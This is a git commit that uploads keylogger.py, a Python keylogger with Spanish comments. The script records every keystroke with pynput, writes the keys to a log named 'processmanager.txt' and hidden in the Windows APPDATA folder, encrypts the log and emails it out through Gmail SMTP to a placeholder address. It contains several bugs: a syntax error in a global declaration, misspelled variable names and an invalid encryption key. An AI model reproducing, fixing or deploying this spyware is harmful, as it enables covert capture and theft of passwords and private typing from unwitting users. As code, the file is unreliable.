49c425f29275c7ca7e9a56338beae734dd24a181
Sergio1260 <35770464+Sergio00166@users.noreply.github.com>
2024-05-03 14:45:10 +0200

    Add files via upload

---
+++ keylogger.py
@@ -0,0 +1,67 @@
+import os
+from pynput.keyboard import Listener
+from cryptography.fernet import Fernet
+import smtplib
+
+keys = []
+count = 0
+path = os.environ['appdata'] +'\\processmanager.txt'
+#path = 'processmanager.txt'
+
+def cifrar(texto, clave): return Fernet(clave).encrypt(texto)
+
+def enviar_correo(sender, recipien, message):
+    sender_email, ender_password = sender
+    # Configuración del servidor SMTP de Gmail
+    smtp_server = 'smtp.gmail.com'
+    smtp_port = 587  # Puerto de Gmail para TLS
+    # Crear conexión segura con el servidor SMTP de Gmail
+    server = smtplib.SMTP(smtp_server, smtp_port)
+    server.starttls()
+    # Iniciar sesión en tu cuenta de Gmail
+    server.login(sender_email, sender_password)
+    # Enviar correo electrónico
+    server.sendmail(sender_email, recipient, message)
+    # Cerrar conexión con el servidor SMTP
+    server.quit()
+
+def on_press(key):
+    global keys, count
+    keys.append(key)
+    count += 1
+    if count >= 1:
+        count = 0
+        write_file(keys)
+        keys = []
+
+def write_file(keys):
+    global sender, recipient, global clave
+    with open(path, 'a') as f:
+        for key in keys:
+            k = str(key).replace("'", "")
+            if k.find('backspace') > 0:
+                f.write(' Backspace ')
+            elif k.find('enter') > 0:
+                f.write('\n')
+            elif k.find('shift') > 0:
+                f.write(' Shift ')
+            elif k.find('space') > 0:
+                f.write(' ')
+            elif k.find('caps_lock') > 0:
+                f.write(' caps_lock ')
+            elif k.find('Key'):
+                f.write(k)
+
+    # Mandamos correo
+    data = "\n".join(open(path,"r").readlines())
+    enviar_correo(sender, recipient, cifrar(data, clave))
+
+
+if __name__=="__main__":
+    sender = ['tucorreo@gmail.com', 'tupassword']
+    recipient = 'correodestino@example.com'
+    clave = "pepepepepepepep"
+    with Listener(on_press=on_press) as listener:
+        listener.join()
+
+
